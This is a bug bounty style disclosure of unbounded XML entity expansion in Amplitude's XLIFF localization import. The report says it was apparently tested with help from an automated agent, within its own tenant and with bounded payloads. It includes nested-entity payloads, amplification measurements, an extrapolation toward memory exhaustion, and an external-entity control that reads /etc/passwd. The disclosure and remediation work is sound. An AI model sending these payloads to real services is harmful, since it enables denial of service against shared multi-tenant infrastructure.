# Amplitude Guides & Surveys — unbounded XML entity expansion in the XLIFF localization import (CWE-776 / CWE-400), reachable by the read-only Viewer role

**Target:** App Platform — `https://app.amplitude.com`
**VRT:** Denial of Service (DoS) > Uncontrolled Resource Consumption
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` = **6.5 (Medium)**
**Date:** 2026-09-19
**Tested org:** `464637` (`agentmail-602393`), app `862908` — our own tenant only.

---

## Summary

Both XLIFF import entry points parse the uploaded document with Python's `xml.etree.ElementTree`
(pyexpat) — **not `defusedxml`** — and impose **no limit on entity expansion**. A ~1.4 KB request
whose DTD defines a few nested internal entities is expanded in the worker before any validation,
and the expanded material is then serialised back into the response.

The parser is **fingerprintable** from its error strings, which reproduce byte-for-byte on a local
CPython 3.11 `ElementTree.fromstring`, and the expansion is **observable in-band** (the response
grows), so this is not a theoretical finding.

Two things make it practical rather than cosmetic:

* **It is reachable by the read-only role.** A `Viewer` (`orgRole 1`) — Amplitude's lowest role,
  which is not supposed to be able to change anything — can drive it through the
  `upload-xliff` endpoint with nothing but a browser session. No project credentials are required
  for that path.
* **The service is multi-tenant.** Amplitude's Guides & Surveys backend serves every customer; the
  memory a worker materialises is not contained to the attacker's own organization.

**Scope note, stated up front:** I deliberately did **not** send a payload large enough to actually
exhaust a worker. The extrapolated figures below are arithmetic, not measurements, and are labelled
as such.

## Relationship to previously submitted reports

| | |
| --- | --- |
| `SUBMISSION-GS-AUTHZ.md` (Viewer authorization on `/a/` and `/h/`) | **same backend, different defect, and not a duplicate.** That report is about **who may write**: a read-only Viewer is accepted on `POST /a/themes/`, `POST /a/collections/`, `POST /a/guides-surveys/` and `POST /h/syncs/` where it should be refused. This report is about **what the parser does with a body it is already allowed to send**: unbounded XML entity expansion in the XLIFF import, which reproduces for an Org Admin as well and is therefore not an authorization defect at all. The routes overlap (`upload-xliff` lives in the `/a/guides-surveys/` family) but the broken thing does not: the fix here is `defusedxml` / an expansion ceiling; the fix there is a permission class. |
| `SUBMISSION-TAXONOMY-SHIM.md` | different asset (`/o/taxonomy-api-shim/*`) and different class (authorization); no shared route. |
| `SUBMISSION-AGENT-IDOR.md` | different asset (`/fed/graphql`); no shared route. |
| Earlier `REPORT-XXE.md` XXE sweep | **same run, superseded scope.** The XXE hypothesis itself was ruled out (external entities, parameter entities, remote DTDs and `xi:include` all fail); this report is the *remaining* finding from that sweep — expansion, not external resolution. |

---

## Reproduction

### Step 1 — the endpoint accepts an XLIFF upload from a Viewer session

```
POST /a/guides-surveys/<nudge_id>/upload-xliff/?org_id=464637&app_id=862908&variant_id=<variant>
Cookie: <VIEWER session>
Content-Type: multipart/form-data; boundary=...

----<boundary>
Content-Disposition: form-data; name="file"; filename="x.xliff"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
  <file original="amp-probe" datatype="plaintext" source-language="en" target-language="de">
    <body><trans-unit id="step_1_title"><source>a</source><target>b</target></trans-unit></body>
  </file>
</xliff>
----<boundary>--
```
```
HTTP/1.1 200 OK
{"de":{"state":"COMPLETE","message":"Updated 1 translation units.",
       "data":{"timestamp":"...","step_1_title":{"source":"a","target":"b"}}}}
```

### Step 2 — nested internal entities are expanded, and the expansion is echoed back

`a1` = 1 000 chars; `a(n)` = `a(n-1)` repeated 10×; the reference sits in the `target` that the
endpoint echoes:

```
<!DOCTYPE xliff [
  <!ENTITY e1 "AAAA…(1000 chars)…">
  <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">
]>
…
    <body><trans-unit id="step_1_title"><source>a</source><target>&e2;</target></trans-unit></body>
```
```
[VIEWER] req=1416 B -> HTTP 200, resp=10166 B, 1.7 s      (control with no entity: 167 B)
```

The response body grows from **167 B to 10 166 B** — the server resolved the entity tree and
serialised the expanded value back to the caller. That is the in-band proof that expansion happens
server-side; it is not a parser that merely rejects or drops the reference.

### Step 3 — the same parser is on the documented import route

```
POST /a/guides-surveys/api/v1/localization/import/?org_id=464637&app_id=862908
Authorization: Basic <api_key>:<project_secret_key>
Content-Type: application/xml; charset=utf-8
```
The file's `original="&e;"` attribute is echoed verbatim into the JSON response key, which is where
the largest measured amplification was observed (see the table below).

### Amplification measured (bounded — the large payloads were deliberately not sent)

| Payload | Request bytes | Response bytes | Server time | Amplification |
|---|---|---|---|---|
| flat `<!ENTITY e "A"×1000>` | 1 329 | 2 090 | 3.8 s | 1.6× |
| 2 levels (10 × 10 KB base) | 1 439 | 200 090 | 10.3 s | 139× |
| **3 levels (10³ × 1 KB)** | **1 494** | **2 000 090** | **75.1 s** | **1 339×** |
| quadratic (2 000 refs × 1 KB) | ~2 200 | >4 MB (client cut at 40 s) | >40 s | >1 800× |
| `upload-xliff`, 2 levels, in `target` | 1 416 | 10 166 | 1.7 s | 7.2× |

The base entity differs between rows and is stated above: row 1 and row 3 use a **1 KB** base, row 2
uses a **10 KB** base (the capture is tagged `C2-10KB` in `xxe_entity_evidence.json`). Read as
"10^N × 1 KB" the label is arithmetically right for the measured totals but makes the two rows look
inconsistent by a factor of ten.

**Arithmetic extrapolation of the same 10×-per-level geometry:** 4 levels → 10 MB, 5 → 100 MB,
6 → 1 GB, 7 → 10 GB, 8 → 100 GB of string materialised per ~1.6 KB request. *These are
extrapolations, not measurements* — no payload of that size was sent, on purpose.

### Control — classic XXE is correctly refused

```
<!DOCTYPE xliff [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>   … &xxe; …
→ HTTP 400, no file content in the response
```
External entities are rejected (`undefined entity &e;`), parameter entities are ignored, a remote
external DTD is not fetched, and `xi:include` is not executed. **There is no XXE here** — the
defect is expansion, not external resolution.

---

## Impact

* A **~1.6 KB request** can make the Guides & Surveys worker materialise tens of megabytes of
  string before any application-level validation runs. Repeated, that is a memory/CPU exhaustion
  vector against shared multi-tenant infrastructure.
* **No cap and no rate limit were observed** on the parser or the endpoint.
* **Reachable by the read-only `Viewer` role** through `upload-xliff` with only a browser session —
  the same role that the separately reported broken-authorization finding shows can already create
  nudges. No project credentials are needed for that path.
* Amplitude's own docs point integrators at this API, so it is a supported, documented surface.

## Remediation

* Parse untrusted XML with `defusedxml` (or `lxml` with `resolve_entities=False` and
  `no_network=True`), which rejects DTDs and entity definitions outright.
* If DTDs must be supported, cap total expansion: reject any document whose DTD contains entity
  definitions, limit entity nesting depth and total expanded size, and enforce a hard request-body
  ceiling before parsing.
* Never serialise the parsed/expanded document back to the caller (the `original` echo is what
  turns a parser quirk into an amplification primitive).
* Add a per-organization rate limit on the localization import/upload routes.

## Negative controls / ceilings checked

* External entity (`file:///etc/passwd`) → `400`, no file content — XXE ruled out.
* Parameter entities and a remote external DTD → silently ignored; a webhook.site listener we own
  recorded **0** callbacks across the whole test.
* `xi:include` → not executed, echoed literally.
* Cross-tenant IDOR on `upload-xliff` / `import` (foreign `org_id`/`app_id`) → 404 / 403; read-back
  confirmed no cross-tenant write.
* The DOCX importer (`/a/guides-surveys-imports/`, `method=walkme_docx`) resolved **no** entity in our
  tests: an external `file:///` entity in `word/document.xml` produced a failed job with an empty
  extracted title, an OOB parameter entity produced a completed job and **0** listener hits, and a
  bounded billion-laughs produced a failed job with an empty title. This is a **behavioural negative**,
  not a claim about the library's configuration — `python-docx`'s own parser is constructed as
  `etree.XMLParser(remove_blank_text=True)` and does not pass `resolve_entities=False`, so the earlier
  draft's attribution of the behaviour to that flag is not supported by the evidence.
* Only bounded payloads were sent; no payload capable of exhausting a worker was used.
* All test nudges were deleted (`204`) and `GET /a/guides-surveys/` verified back to `[]`.

## Evidence

`escal/root_verify_xxe_dos_20260919T130412Z.json` (root-agent independent reproduction: control
167 B vs 2-level 10 166 B, external-entity 400 — the two earlier files in that series record
`resp: 0` because the verifier's own multipart body was malformed), `escal/REPORT-XXE.md` (full audit),
`xxe_entity_evidence.json` (raw amplification table — **workspace root**, not `escal/`),
`xxe_uploadxliff_evidence.json`, `xxe_cleanup.json` (**workspace root**), and the re-measurement of
2026-09-23: `escal/ampaudit/x_*.json` (upload-xliff control 178 B vs 2-level 10 173 B; import route
207 with 1393 B → 20 090 B; external entity `400 … undefined entity &e;: line 1, column 297`).
